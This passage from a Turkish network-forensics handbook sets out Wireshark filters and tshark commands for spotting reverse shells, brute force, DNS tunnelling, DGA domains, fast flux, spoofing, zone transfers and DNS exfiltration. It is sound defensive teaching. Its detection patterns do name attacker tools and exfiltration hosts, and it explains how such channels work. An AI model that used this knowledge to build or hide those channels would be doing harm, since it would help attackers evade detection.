- `tcp.dstport >= 49152 && ip.dst == 203.0.113.50` → dış IP'nin dinamik portlarına giden bağlantılar

**Filtreden sonra yol tarifi:**

1. Conversations ▸ TCP'de "Port B" sütununa göre sırala, alışılmadık portları işaretle.
2. 4444 (Metasploit varsayılanı), 1337/31337, 9001 (Tor), 6667 (IRC) gibi portlar doğrudan şüphelidir.
3. Bağlantıyı kimin başlattığına bak (SYN). İçeriden dışarı = reverse shell/C2; dışarıdan içeri = bind shell veya yetkisiz servis.
4. Follow Stream ile içeriği oku.

**Terimler:**

- **Ephemeral port**: İşletim sisteminin istemciye geçici atadığı yüksek port (Windows 49152-65535).
- **Bind shell**: Kurbanın bir port açıp saldırganın bağlanmasını beklemesi.
- **Reverse shell**: Kurbanın saldırgana bağlanması (firewall'u atlatmak için tercih edilir).

> **Anlık karar:** Port 4444 görürsen önce Metasploit düşün (Problem 178).


</details>

<details>
<summary><strong>069 · Dışarıdan içeriye beklenmeyen bağlantı (inbound)</strong></summary>

**Metafor:** Kimseyi davet etmediğin halde kapını açıp içeri giren misafir.

**Senden istenen:** "İnternetten iç ağa doğrudan erişim olmuş mu?"

**Filtreler (araştırma yolu):**

- `tcp.flags.syn == 1 && tcp.flags.ack == 0 && !(ip.src == 10.0.0.0/8 || ip.src == 172.16.0.0/12 || ip.src == 192.168.0.0/16) && (ip.dst == 10.0.0.0/8 || ip.dst == 172.16.0.0/12 || ip.dst == 192.168.0.0/16)` → dış kaynaktan iç hedefe bağlantı başlatma
- `tcp.flags.syn == 1 && tcp.flags.ack == 1 && (ip.src == 10.0.0.0/8 || ip.src == 192.168.0.0/16) && !(ip.dst == 10.0.0.0/8 || ip.dst == 192.168.0.0/16)` → iç hostun dışarıya "evet, bağlan" demesi

**Filtreden sonra yol tarifi:**

1. İlk filtreyi uygula; dış IP'den iç IP'ye SYN varsa kimin, hangi porta denediğini bul.
2. İkinci filtreyle hangilerinin başarılı olduğunu (iç hostun SYN-ACK döndüğünü) gör.
3. Başarılı bağlantının porta göre anlamını çıkar: 3389 (RDP), 22 (SSH), 445 (SMB) internete açık olmamalı.
4. Bu bağlantının içinde ne yapıldığını takip et (brute force, istismar, oturum açma).

**Terimler:**

- **Inbound / Outbound**: İçeri gelen / dışarı giden trafik.
- **RFC1918**: Özel IP blokları: 10/8, 172.16/12, 192.168/16.

> **Anlık karar:** İç hostun dışarıya SYN-ACK vermesi = internete açık servis. Bu tek başına kritik bulgudur.


</details>

<details>
<summary><strong>070 · Bağlantı başarılı mı başarısız mı? (tcp.completeness)</strong></summary>

**Metafor:** Bir telefon kaydında aramanın açılıp açılmadığını, konuşulup konuşulmadığını tek bir notla görmek.

**Senden istenen:** "Kaç bağlantı başarıyla kuruldu?", "Saldırgan hangi bağlantıda veri aktardı?"

**Filtreler (araştırma yolu):**

- `tcp.completeness == 31` → tam akış: SYN, SYN-ACK, ACK, veri, FIN (kapanış) görüldü
- `tcp.completeness.str contains "D"` → veri taşımış akışlar (yeni sürümlerde harfli gösterim)
- `tcp.completeness <= 3` → sadece SYN veya SYN+SYN-ACK görülen (başarısız/tarama) akışlar
- `tcp.completeness & 4` → veri (Data) bayrağı olan akışlar

**Filtreden sonra yol tarifi:**

1. Paket detayında TCP ▸ [Conversation completeness] satırına bak; değer bit toplamıdır.
2. Bitler: 1 = SYN, 2 = SYN-ACK, 4 = ACK, 8 = Data, 16 = FIN, 32 = RST. (Örn. 1+2+4+8+16 = 31 temiz ve tam bir bağlantı.)
3. Tarama akışlarını (completeness ≤ 3) dışarıda bırakıp sadece veri taşıyanlara odaklan.
4. Bu alanı sütun olarak eklersen akışları hızla sınıflandırırsın.

**Terimler:**

- **Completeness**: Wireshark'ın akışın hangi aşamalarını gördüğünü özetlediği bit değeri.

> **Anlık karar:** Binlerce akışın olduğu bir taramada `tcp.completeness & 8` (veri var) filtresi gerçek konuşmaları saniyede ayıklar.


</details>

<details>
<summary><strong>071 · Bir bağlantıda ne kadar veri aktarıldı?</strong></summary>

**Metafor:** Kamyonun kantara girip çıkarken tartılması. Fark, taşınan yüktür.

**Senden istenen:** "Saldırgan kaç byte indirdi/yükledi?", "Sızdırılan veri ne kadar?"

**Filtreler (araştırma yolu):**

- `tcp.stream == 7 && tcp.len > 0` → sadece veri taşıyan paketler
- `tcp.stream == 7 && ip.src == 10.0.0.20 && tcp.len > 0` → tek yönde veri

**Menü / araç:**

- Statistics ▸ Conversations ▸ TCP → Bytes A→B ve Bytes B→A sütunları

**Komut satırı:**

```bash
tshark -r kanit.pcapng -Y 'tcp.stream == 7 && ip.src == 10.0.0.20' -T fields -e tcp.len | paste -sd+ | bc
```

**Filtreden sonra yol tarifi:**

1. Conversations'ta ilgili satırı bul; yön sütunları başlıklar dahil byte verir.
2. Sadece uygulama verisi (payload) isteniyorsa tcp.len değerlerini topla (tshark komutu).
3. Follow Stream penceresinin altında da toplam byte yazar (her yön için ayrı seçilebilir).
4. Sorunun "dosya boyutu" mu "ağ trafiği" mi istediğini ayır; başlıklar ve retransmission'lar ağ trafiğini şişirir.

**Terimler:**

- **Payload byte**: Sadece uygulama verisi, başlıklar hariç.
- **tcp.len**: Bir TCP segmentindeki veri uzunluğu.

> **Anlık karar:** "Kaç byte sızdırıldı?" sorusunda yönü doğru seç: iç host → dış host.


</details>

<details>
<summary><strong>072 · Seq/ack ile kayıp veriyi ayırt etmek (kayıt mı eksik, ağ mı?)</strong></summary>

**Metafor:** Kitapta eksik sayfa var. Matbaa mı basmadı, yoksa sen mi fotokopi çekerken atladın?

**Senden istenen:** "Dosya neden eksik çıktı?", "Bu akışın tamamı kayıtta var mı?"

**Filtreler (araştırma yolu):**

- `tcp.analysis.lost_segment` → "previous segment not captured": arada veri var ama kayıtta yok
- `tcp.analysis.ack_lost_segment` → "ACKed unseen segment": karşı taraf aldı ama biz görmedik
- `tcp.analysis.retransmission && tcp.stream == 7` → gerçek ağ kaybı ve tekrar gönderim

**Filtreden sonra yol tarifi:**

1. lost_segment + ack_lost_segment birlikte görülüyorsa veri ağda iletilmiş ama sensör kaçırmış demektir (kayıt eksik).
2. lost_segment + retransmission ise veri ağda kaybolmuş ve yeniden gönderilmiştir (ağ sorunu, kayıt sağlam).
3. Kayıt eksikse çıkarılan dosya bozuk olabilir; raporda bunu belirt.
4. Mümkünse başka sensörün kaydıyla birleştir (Problem 011).

**Terimler:**

- **Capture loss**: Yakalayan cihazın paketleri kaçırması.
- **ACKed unseen segment**: Alındığı onaylanmış ama kayıtta görünmeyen veri.

> **Anlık karar:** "ACKed unseen" = senin sensörün kör noktası. Ağda sorun yok, kanıtta boşluk var.


</details>

<details>
<summary><strong>073 · Banner grabbing tespiti</strong></summary>

**Metafor:** Mağazanın vitrin yazısını okumak için kapıyı aralayıp hemen kapatmak.

**Senden istenen:** "Saldırgan servis bannerlarını topladı mı?"

**Filtreler (araştırma yolu):**

- `(ftp.response.code == 220 || smtp.response.code == 220 || ssh.protocol) && ip.dst == 10.0.0.5` → hosta giden FTP/SMTP/SSH karşılama mesajları
- `ssh.protocol` → SSH sürüm satırları (ör. SSH-2.0-OpenSSH_8.2)
- `tcp.len > 0 && tcp.flags.fin == 1 && tcp.stream < 100` → veri gelir gelmez kapanan kısa akışlar

**Filtreden sonra yol tarifi:**

1. Kısa akışları bul: bağlan → sunucunun ilk mesajını al → kapat.
2. Sunucunun ilk mesajını (banner) Follow Stream ile oku; yazılım adı ve sürümü genelde buradadır.
3. İstemci tarafından hiç veri gönderilmemesi banner grabbing'in tipik özelliğidir (netcat, nmap -sV).
4. Banner'daki sürümün bilinen zafiyeti varsa saldırganın sonraki adımını tahmin edebilirsin.

**Terimler:**

- **Banner**: Servisin bağlantı açılınca kendini tanıttığı ilk mesaj.
- **Fingerprinting**: Yazılımı ve sürümünü tanımlama.

> **Anlık karar:** Banner'ı sen de oku. Saldırganın gördüğü sürüm, saldırganın seçeceği exploit'i söyler.


</details>

<details>
<summary><strong>074 · Telnet/SSH/FTP brute force: çok sayıda kısa bağlantı</strong></summary>

**Metafor:** Bir kasanın şifresini tek tek denemek. Her deneme kısa, deneme sayısı çok.

**Senden istenen:** "Parola deneme saldırısı var mı, başarılı oldu mu?"

**Filtreler (araştırma yolu):**

- `tcp.dstport == 22 && tcp.flags.syn == 1 && tcp.flags.ack == 0` → SSH bağlantı denemeleri
- `ftp.response.code == 530` → FTP: hatalı giriş
- `ftp.response.code == 230` → FTP: başarılı giriş
- `telnet.data contains "incorrect"` → Telnet hatalı giriş mesajı

**Filtreden sonra yol tarifi:**

1. Hedef porta kısa sürede gelen bağlantı sayısını ölç; Conversations ▸ TCP'de aynı kaynaktan yüzlerce kısa akış brute force'tur.
2. Şifresiz protokollerde (FTP, Telnet) denenen parolaları doğrudan oku (Problem 201, 203).
3. SSH şifreli olduğu için içeriği göremezsin; başarıyı akış davranışından tahmin et: başarısız denemeler kısa ve küçük, başarılı oturum uzun ve büyüktür.
4. Başarılı denemeden sonraki aktiviteyi takip et.

**Terimler:**

- **Brute force**: Tüm olasılıkları deneme.
- **Password spraying**: Tek parolayı çok kullanıcıda deneme (Problem 159).
- **530 / 230**: FTP'de giriş başarısız / başarılı kodları.

> **Anlık karar:** SSH'de başarıyı görmek için akış boyutuna bak: diğerlerinden belirgin şekilde uzun ve büyük olan akış "içeri girdi" demektir.


</details>

<details>
<summary><strong>075 · Bağlantıların zaman çizelgesi: ilk ve son temas</strong></summary>

**Metafor:** Bir ziyaretçinin bina giriş-çıkış kartı kayıtları. Ne zaman geldi, ne zaman gitti, arada nerelere uğradı.

**Senden istenen:** "Saldırganın ağdaki aktivitesi ne zaman başladı ve bitti?", "Hangi sırayla hangi hostlara gitti?"

**Filtreler (araştırma yolu):**

- `ip.addr == 10.0.0.5 && tcp.flags.syn == 1 && tcp.flags.ack == 0` → saldırganın başlattığı her bağlantı

**Menü / araç:**

- Statistics ▸ Conversations ▸ TCP/UDP → "Rel Start" ve "Duration" sütunları; "Absolute start time" kutusunu işaretle
- Statistics ▸ Flow Graph → "Limit to display filter" + "TCP Flows" ile görsel zaman çizgisi

**Komut satırı:**

```bash
tshark -r kanit.pcapng -Y 'ip.src == 10.0.0.5 && tcp.flags.syn == 1 && tcp.flags.ack == 0' -T fields -e frame.time_utc -e ip.dst -e tcp.dstport
```

**Filtreden sonra yol tarifi:**

1. Saldırgan IP'sinin başlattığı tüm bağlantıları filtrele.
2. tshark komutuyla "zaman - hedef IP - hedef port" listesini al; bu senin ham zaman çizelgendir.
3. Listeyi aşamalara böl: keşif (tarama), erişim (ilk başarılı bağlantı), yanal hareket (iç hostlara), sızdırma (dışarı büyük veri).
4. Flow Graph ile görsel kontrol yap.

**Terimler:**

- **Timeline**: Olayların zamana göre sıralı listesi; DFIR raporunun omurgası.
- **Lateral movement**: Saldırganın ele geçirdiği makineden diğer iç makinelere geçmesi.

> **Anlık karar:** Zaman çizelgesi bitmeden rapor yazma. Her bulgu çizelgede bir satır olmalı.


</details>

## D · DNS: Ağın Telefon Rehberi

*Neredeyse her kötü niyetli eylem bir DNS sorgusuyla başlar. Zararlı önce "evim nerede?" diye sorar. DNS'i okumayı bilen analist, saldırının adresini ilk öğrenen kişi olur.*

<details>
<summary><strong>076 · Bir makinenin hangi alan adlarını sorguladığını listelemek</strong></summary>

**Metafor:** Birinin telefon rehberinde kimleri aradığına bakmak; ziyaret ettiği her yerin listesi.

**Senden istenen:** "Kurban makine hangi domainlere gitti?", "Zararlı alan adı hangisi?"

**Filtreler (araştırma yolu):**

- `dns.flags.response == 0 && ip.src == 10.0.0.20` → kurbanın sorguları
- `dns.flags.response == 0 && !(dns.qry.name contains "microsoft" || dns.qry.name contains "windows" || dns.qry.name contains "google")` → bilinen büyük servisler hariç

**Menü / araç:**

- Statistics ▸ DNS → sorgu türleri, cevap kodları, sorgu sayıları

**Komut satırı:**

```bash
tshark -r kanit.pcapng -Y 'dns.flags.response == 0 && ip.src == 10.0.0.20' -T fields -e dns.qry.name | sort | uniq -c | sort -rn
```

**Filtreden sonra yol tarifi:**

1. Sorguları filtrele ve dns.qry.name'i sütun olarak ekle.
2. tshark komutuyla benzersiz alan adlarını sıklığıyla birlikte listele.
3. Listeyi üç gruba ayır: bilinen meşru (microsoft, google), bilinen kurumsal (şirketin kendi alanları), bilinmeyen. Bilinmeyenlere odaklan.
4. Nadir sorgulanan, garip görünen (rastgele harfler, uzun alt alan adları, yeni TLD'ler: .top, .xyz, .ru gibi) alanları işaretle.
5. Her şüpheli alan için ilk sorgu zamanını ve ardından gelen bağlantıyı bul (Problem 085).

**Terimler:**

- **DNS**: Alan adını IP adresine çeviren sistem (ağın telefon rehberi).
- **Query (sorgu) / Response (cevap)**: DNS'te soru ve cevap paketleri.
- **TLD**: En üst seviye alan (.com, .org, .tr).

> **Anlık karar:** Frekans analizi altın kuraldır: en çok sorgulanan değil, en az sorgulanan ve en garip olan şüphelidir.


</details>

<details>
<summary><strong>077 · DNS tünelleme tespiti (uzun alt alan adları)</strong></summary>

**Metafor:** Telefon rehberine "Ahmet-gizlibelge-sayfa1-satir3" adında sahte kişiler yazarak bilgi kaçırmak. Her sorgu aslında bir veri parçasıdır.

**Senden istenen:** "DNS üzerinden tünel/veri kaçırma var mı?", "Hangi araç kullanılmış (iodine, dnscat2, dns2tcp)?"

**Filtreler (araştırma yolu):**

- `dns.qry.name.len > 50` → anormal uzun alan adları
- `len(dns.qry.name) > 50 && dns.flags.response == 0` → aynısı, fonksiyonla
- `dns.qry.type == 16 || dns.qry.type == 10` → TXT ve NULL kayıtları (tünel araçlarının favorisi)
- `dns.count.labels > 6` → çok fazla nokta (etiket) içeren adlar
- `dns.qry.name contains "dnscat"` → dnscat2'nin bazı modlarda bıraktığı iz

**Filtreden sonra yol tarifi:**

1. Uzun ad filtresini uygula. Meşru adlar nadiren 50 karakteri geçer.
2. Ortak üst alanı (ör. *.t.saldirgan.com) bul. Tüm uzun sorgular aynı ana alana gidiyorsa tünel kesinleşir.
3. Alt alan adı kısmını incele: hex (0-9a-f), base32 (A-Z2-7) veya base64 benzeri ise kodlanmış veridir.
4. Sorgu sıklığına bak: saniyede çok sayıda sorgu aynı alana gidiyorsa aktif veri aktarımıdır.
5. Veriyi çözmek için alt alan kısımlarını sırayla birleştir ve kodlamayı çöz (Problem 088).

**Terimler:**

- **Subdomain (alt alan adı)**: Ana alanın önüne eklenen kısım (veri.saldirgan.com'da "veri").
- **Label (etiket)**: Noktalar arasındaki her parça.
- **TXT kaydı**: Serbest metin taşıyabilen DNS kaydı türü.

> **Anlık karar:** Tek bir ana alana giden, uzun, rastgele görünümlü ve sık sorgular = DNS tüneli. Üç işaret yeterli.


</details>

<details>
<summary><strong>078 · TXT kayıtları ile komut ve veri taşıma</strong></summary>

**Metafor:** Rehberdeki "not" kısmına talimat yazmak. Zararlı her sorguda "bugün ne yapayım?" diye sorar, cevap TXT'de gelir.

**Senden istenen:** "C2 komutları DNS TXT cevaplarında mı geliyor?"

**Filtreler (araştırma yolu):**

- `dns.qry.type == 16` → TXT sorguları
- `dns.txt` → TXT cevaplarının içeriği
- `dns.txt && dns.resp.len > 100` → uzun TXT cevapları
- `dns.txt matches "^[A-Za-z0-9+/=]{40,}$"` → base64'e benzeyen TXT içerikleri

**Filtreden sonra yol tarifi:**

1. TXT sorgularını filtrele ve sorgulanan alanları listele. SPF/DKIM/doğrulama kayıtları (v=spf1, google-site-verification) meşrudur.
2. TXT cevap içeriklerini (dns.txt) sütun olarak ekle ve oku.
3. Base64 benzeri içerik varsa CyberChef veya base64 -d ile çöz; PowerShell komutu, URL veya ikili dosya çıkabilir.
4. Sorguların periyodik olup olmadığına bak; düzenli TXT sorguları beacon'dır (Problem 176).

**Terimler:**

- **SPF**: E-posta gönderim yetkisini belirten, TXT içinde tutulan meşru kayıt.
- **C2**: Command and Control; saldırganın zararlıya komut verdiği kanal.
- **Base64**: İkili veriyi harf/rakamla yazma kodlaması; sonu genelde = ile biter.

> **Anlık karar:** İç ağdaki bir iş istasyonunun sürekli TXT sorgulaması normal değildir. İstasyonlar A/AAAA sorar, TXT nadiren.


</details>

<details>
<summary><strong>079 · DGA (rastgele üretilmiş alan adları) tespiti</strong></summary>

**Metafor:** Hırsızın her gün farklı ve önceden hesaplanmış bir buluşma yeri belirlemesi. Polis birini kapatsa da yarın başka yer hazırdır.

**Senden istenen:** "Zararlı DGA kullanıyor mu?", "Hangi alan adı sonunda çözüldü (aktif C2)?"

**Filtreler (araştırma yolu):**

- `dns.flags.rcode == 3` → NXDOMAIN cevapları (DGA'nın çoğu alanı kayıtlı değildir)
- `dns.flags.rcode == 3 && ip.dst == 10.0.0.20` → kurbana dönen NXDOMAIN'ler
- `dns.flags.response == 1 && dns.flags.rcode == 0 && dns.a && ip.dst == 10.0.0.20` → başarıyla çözülen (aktif) alanlar
- `dns.qry.name matches "^[a-z0-9]{12,}\\.(com|net|org|info|biz|top|xyz)$"` → uzun, anlamsız tek etiketli alanlar

**Filtreden sonra yol tarifi:**

1. NXDOMAIN filtresini uygula; tek makineden kısa sürede onlarca NXDOMAIN = DGA güçlü adayı.
2. Alan adlarına bak: sesli harf/sessiz harf dengesi bozuk, okunamayan, aynı uzunlukta ve aynı TLD'de alanlar DGA işaretidir.
3. Aynı kurbandan, aynı dönemde başarılı çözülen alanı bul; zararlının ulaştığı aktif C2 odur.
4. Çözülen IP'ye sonrasında bağlantı kuruldu mu kontrol et (Problem 085).

**Terimler:**

- **DGA**: Domain Generation Algorithm; zararlının algoritmayla her gün yüzlerce alan adı üretmesi.
- **NXDOMAIN**: "Böyle bir alan yok" cevabı (rcode 3).
- **rcode**: DNS cevap kodu: 0 başarılı, 2 sunucu hatası, 3 alan yok, 5 reddedildi.

> **Anlık karar:** NXDOMAIN yağmurunun içinde tek bir başarılı cevap aranır. O tek cevap saldırganın gerçek adresidir.


</details>

<details>
<summary><strong>080 · NXDOMAIN fırtınası</strong></summary>

**Metafor:** Rehberde olmayan numaraları ısrarla arayan biri; ya rehberi eskimiş ya da bir şey deniyor.

**Senden istenen:** "Bu kadar başarısız DNS sorgusu neden?"

**Filtreler (araştırma yolu):**

- `dns.flags.rcode == 3` → NXDOMAIN cevapları
- `dns.flags.rcode == 3 && dns.qry.name contains ".local"` → yerel alan sorunları (genelde yapılandırma)
- `dns.flags.rcode == 2` → SERVFAIL: sunucu cevap veremedi

**Filtreden sonra yol tarifi:**

1. NXDOMAIN'leri filtrele ve Statistics ▸ Endpoints ile hangi istemcinin ürettiğini bul.
2. Sorgulanan adların ortak özelliğini bul: rastgele (DGA), yazım hatası (kullanıcı), eski sunucu adı (yapılandırma) veya alt alan taraması (subdomain brute force).
3. Alt alan taraması: aynı ana alanın altında admin, dev, test, mail, vpn gibi kelime listesi sorguları (ör. dnsenum, gobuster dns).
4. Kaynağı ve hedef alanı not et.

**Terimler:**

- **Subdomain enumeration**: Bir alanın alt alan adlarını kelime listesiyle tahmin etme.
- **SERVFAIL**: DNS sunucusunun sorguyu işleyemediği hata cevabı.

> **Anlık karar:** Rastgele adlar = DGA. Sözlük kelimeleri + aynı ana alan = keşif taraması. Tek tip ad tekrar tekrar = yapılandırma hatası.


</details>

<details>
<summary><strong>081 · Fast flux (sürekli değişen IP'ler)</strong></summary>

**Metafor:** Bir dolandırıcının her aramada farklı bir telefon numarasından seni araması; numarayı engellesen de yenisi gelir.

**Senden istenen:** "Alan adı çok sayıda farklı IP'ye mi çözülüyor?"

**Filtreler (araştırma yolu):**

- `dns.count.answers > 5 && dns.a` → çok sayıda A kaydı dönen cevaplar
- `dns.resp.ttl < 300 && dns.a` → çok kısa ömürlü (TTL) cevaplar
- `dns.qry.name == "supheli-alan.com" && dns.flags.response == 1` → tek alanın tüm cevapları

**Komut satırı:**

```bash
tshark -r kanit.pcapng -Y 'dns.qry.name == "supheli-alan.com" && dns.a' -T fields -e dns.a | tr ',' '\n' | sort -u
```

**Filtreden sonra yol tarifi:**

1. Şüpheli alanın tüm cevaplarını filtrele, dönen IP'leri listele.
2. Kısa sürede çok sayıda farklı IP ve düşük TTL = fast flux.
3. IP'lerin farklı ülke/ağlarda olması (ev kullanıcıları gibi) botnet altyapısına işaret eder (GeoIP, Problem 246).
4. Meşru CDN'ler de çok IP döndürür; CDN'ler aynı kurumsal ağda (ASN) olur, fast flux dağınıktır.

**Terimler:**

- **Fast flux**: Zararlı alanın IP'lerinin ele geçirilmiş makineler arasında hızla değiştirilmesi.
- **TTL (DNS)**: Cevabın ne kadar süre önbellekte tutulacağı (saniye).
- **ASN**: Bir kurumun IP bloklarına verilen ağ numarası.

> **Anlık karar:** Çok IP + kısa TTL + dağınık ülkeler = fast flux. Çok IP + kısa TTL + tek kurum = CDN.


</details>

<details>
<summary><strong>082 · DNS spoofing / cache poisoning</strong></summary>

**Metafor:** Rehberdeki bankanın numarasını sahte bir numarayla değiştirmek. Herkes "bankayı" arar, dolandırıcıya bağlanır.

**Senden istenen:** "DNS cevapları sahte mi?", "Kurban yanlış IP'ye mi yönlendirildi?"

**Filtreler (araştırma yolu):**

- `dns.flags.response == 1 && dns.qry.name == "banka.com"` → hedef alanın tüm cevapları
- `dns.flags.response == 1 && !(ip.src == 10.0.0.53)` → meşru DNS sunucusu dışından gelen cevaplar
- `dns.unsolicited` → Wireshark'ın sorusuz cevap olarak işaretledikleri
- `dns.retransmit_response` → aynı soruya birden fazla cevap

**Filtreden sonra yol tarifi:**

1. Aynı sorguya (aynı dns.id) birden fazla cevap var mı bak. İki farklı cevap = yarış (race) spoofing'i; ilk gelen kazanır.
2. Cevabı gönderen IP gerçek DNS sunucusu mu? MAC adresi ve TTL tutarlı mı?
3. Dönen IP'yi beklenenle karşılaştır; iç ağdaki bir IP'ye (saldırgan) çözülüyorsa spoofing'dir.
4. Kurbanın sonraki bağlantısının sahte IP'ye gittiğini doğrula.

**Terimler:**

- **DNS spoofing**: Sahte DNS cevabı göndermek.
- **Cache poisoning**: DNS sunucusunun önbelleğine sahte kayıt sokmak.
- **Transaction ID (dns.id)**: Soru ve cevabı eşleştiren 16 bitlik numara.

> **Anlık karar:** Aynı soruya iki cevap = biri sahte. Önce gelen ve DNS sunucusu dışından gelen cevaba odaklan.


</details>

<details>
<summary><strong>083 · Zone transfer (AXFR) ile bilgi sızıntısı</strong></summary>

**Metafor:** Birinin santrale "bana tüm şirketin dahili numara listesini faksla" demesi ve santralin de göndermesi.

**Senden istenen:** "Saldırgan iç DNS kayıtlarının tamamını aldı mı?"

**Filtreler (araştırma yolu):**

- `dns.qry.type == 252` → AXFR (tam alan aktarımı) istekleri
- `dns.qry.type == 251` → IXFR (artımlı aktarım)
- `tcp.port == 53` → DNS over TCP (zone transfer TCP kullanır)

**Filtreden sonra yol tarifi:**

1. AXFR isteğini filtrele; isteyen IP ikincil DNS sunucusu değilse yetkisiz denemedir.
2. Cevap geldiyse (TCP 53 üzerinde büyük veri) transfer başarılı olmuştur.
3. Follow TCP Stream veya paket detayından aktarılan kayıtları oku: tüm hostname ve IP'ler orada.
4. Raporda hem saldırıyı hem de "DNS sunucusu herkese AXFR veriyor" yapılandırma zafiyetini yaz.

**Terimler:**

- **Zone**: Bir DNS sunucusunun yönettiği alan kayıtları.
- **AXFR**: Zone'un tamamını aktarma isteği.

> **Anlık karar:** TCP 53'te büyük cevap = zone transfer veya DNS tüneli. İkisi de raporlanır.


</details>

<details>
<summary><strong>084 · Şüpheli alan adının hangi IP'ye çözüldüğünü bulmak</strong></summary>

**Metafor:** Rehberde ismi bulup karşısındaki numarayı okumak.

**Senden istenen:** "kotu-alan.com hangi IP'ye çözüldü?" (en sık sorulan DNS sorularından)

**Filtreler (araştırma yolu):**

- `dns.qry.name == "kotu-alan.com" && dns.flags.response == 1` → alanın cevapları
- `dns.resp.name contains "kotu-alan"` → cevap içindeki ad (CNAME zinciri dahil)
- `dns.cname` → CNAME (takma ad) içeren cevaplar

**Filtreden sonra yol tarifi:**

1. Cevap paketini seç, detayda "Answers" bölümünü aç.
2. A kaydı (IPv4) veya AAAA (IPv6) değerini oku. CNAME varsa zinciri sonuna kadar takip et.
3. Birden fazla cevap varsa hepsini not et.
4. Bu IP'ye ip.addr filtresiyle bağlantı yapılmış mı kontrol et.

**Terimler:**

- **A / AAAA kaydı**: Alan adının IPv4 / IPv6 adresi.
- **CNAME**: Bir adın başka bir ada yönlendirilmesi (takma ad).

> **Anlık karar:** Cevap paketinde soru da tekrar yazar. Filtrede dns.qry.name kullanmak soru ve cevabı birlikte getirir; cevabı ayırmak için dns.flags.response == 1 ekle.


</details>

<details>
<summary><strong>085 · DNS sorgusunu sonraki bağlantıyla eşleştirmek</strong></summary>

**Metafor:** Birinin rehberden numarayı bulduktan sonra gerçekten aradığını telefon kayıtlarıyla doğrulamak.

**Senden istenen:** "Zararlı alana çözüldükten sonra ne yapıldı?", "Hangi bağlantı bu DNS'in sonucu?"

**Filtreler (araştırma yolu):**

- `dns.a == 203.0.113.50` → bu IP'yi döndüren DNS cevabı
- `ip.addr == 203.0.113.50 && !dns` → o IP ile yapılan DNS dışı trafik
- `http.host == "kotu-alan.com" || tls.handshake.extensions_server_name == "kotu-alan.com"` → alan adının HTTP/TLS'te kullanıldığı paketler

**Filtreden sonra yol tarifi:**

1. Şüpheli alanın cevabındaki IP'yi al.
2. Bu IP ile yapılan ilk bağlantıyı bul; DNS cevabından hemen sonra (milisaniyeler içinde) olmalı.
3. HTTP Host veya TLS SNI alanında aynı alan adı yazıyorsa eşleşme kesindir.
4. Bağlantıda ne yapıldığını (indirme, POST, şifreli C2) incele.

**Terimler:**

- **SNI**: TLS'te bağlanılmak istenen alan adının açıkça yazdığı alan (Problem 126).
- **Korelasyon**: Farklı olayları ilişkilendirme.

> **Anlık karar:** DNS cevabı → (aynı IP'ye) SYN arasındaki süre çok kısaysa otomatik davranış (zararlı/tarayıcı), dakikalarsa insan tıklaması olabilir.


</details>

<details>
<summary><strong>086 · İç DNS yerine dış DNS kullanan makine</strong></summary>

**Metafor:** Şirket santrali yerine kendi cep telefonuyla gizlice arama yapan çalışan.

**Senden istenen:** "Hangi makine kurumsal DNS'i atlatıyor?"

**Filtreler (araştırma yolu):**

- `dns && !(ip.addr == 10.0.0.53)` → kurumsal DNS sunucusu dışında DNS trafiği
- `dns && (ip.dst == 8.8.8.8 || ip.dst == 1.1.1.1 || ip.dst == 9.9.9.9)` → popüler genel DNS sunucuları
- `udp.dstport == 53 && !(ip.dst == 10.0.0.0/8)` → iç ağdan dış IP'ye doğrudan DNS

**Filtreden sonra yol tarifi:**

1. Kurumsal DNS sunucularının IP'lerini öğren (DHCP Option 6 cevaplarında yazar).
2. Bunların dışına giden DNS trafiğini filtrele.
3. Kaynak makineleri listele; zararlılar bazen kendi DNS sunucularını sabit kodlar.
4. Dış DNS'e sorulan alanlar özellikle şüphelidir; listele ve incele.

**Terimler:**

- **Hardcoded DNS**: Zararlının sistem ayarı yerine kendi içine yazılmış DNS sunucusu kullanması.
- **DHCP Option 6**: DHCP'nin istemciye bildirdiği DNS sunucuları.

> **Anlık karar:** Kurumsal ağda iş istasyonu doğrudan 8.8.8.8'e soruyorsa ya yapılandırma hatası ya zararlı. İkisi de raporlanır.


</details>

<details>
<summary><strong>087 · DNS over HTTPS (DoH) ve DNS over TLS (DoT) tespiti</strong></summary>

**Metafor:** Mektupları açık kartpostal yerine kilitli zarfla göndermek. İçeriği göremezsin ama zarfın kime gittiğini görürsün.

**Senden istenen:** "DNS izleme atlatılıyor mu, şifreli DNS kullanılıyor mu?"

**Filtreler (araştırma yolu):**

- `tcp.port == 853` → DoT (DNS over TLS) varsayılan portu
- `tls.handshake.extensions_server_name in {"dns.google", "cloudflare-dns.com", "mozilla.cloudflare-dns.com", "dns.quad9.net", "doh.opendns.com"}` → bilinen DoH sağlayıcılarına TLS bağlantısı
- `http2.headers.path contains "dns-query"` → (TLS çözülmüşse) DoH istek yolu
- `tls.handshake.extensions_alpn_str == "dot"` → ALPN'de DoT bildirimi

**Filtreden sonra yol tarifi:**

1. 853 portunu filtrele: DoT kullanımı varsa doğrudan görünür.
2. DoH 443 üzerinden gider; SNI'de bilinen DoH sağlayıcılarını ara.
3. DoH kullanan makinede normal DNS sorgularının birden azalması veya hiç olmaması da işarettir.
4. TLS anahtarın varsa (Problem 128) çözüp /dns-query isteklerini okuyabilirsin.

**Terimler:**

- **DoH / DoT**: DNS sorgularını HTTPS / TLS içinde şifreleme.
- **ALPN**: TLS el sıkışmasında hangi uygulama protokolünün konuşulacağını bildiren alan.

> **Anlık karar:** Şifreli DNS içeriği görünmez ama varlığı görünür. Kurumsal politikada yasaksa bu bir bulgudur.


</details>

<details>
<summary><strong>088 · DNS ile veri sızdırma: alt alan adlarında kodlanmış veri</strong></summary>

**Metafor:** Her kartpostalın üzerine gönderen adı yerine şifreli bir mesaj parçası yazmak.

**Senden istenen:** "DNS sorgularında hangi veri sızdırılmış? Flag'i çıkar."

**Filtreler (araştırma yolu):**

- `dns.flags.response == 0 && dns.qry.name contains ".exfil.saldirgan.com"` → tek bir hedef alana giden sorgular
- `dns.flags.response == 0 && dns.qry.name matches "^[0-9a-f]{16,}\\."` → hex kodlu alt alan adları

**Komut satırı:**

```bash
tshark -r kanit.pcapng -Y 'dns.flags.response == 0 && dns.qry.name contains "saldirgan.com"' -T fields -e dns.qry.name | awk -F. '{print $1}' | uniq > parcalar.txt
tr -d '\n' < parcalar.txt | xxd -r -p > cikti.bin
```

**Filtreden sonra yol tarifi:**

1. Hedef ana alanı belirle ve sadece o alanın sorgularını al (cevapları değil; aynı sorgu iki kez sayılmasın).
2. Alt alan kısmını ayıkla (awk ile ilk etiket veya ana alandan önceki her şey).
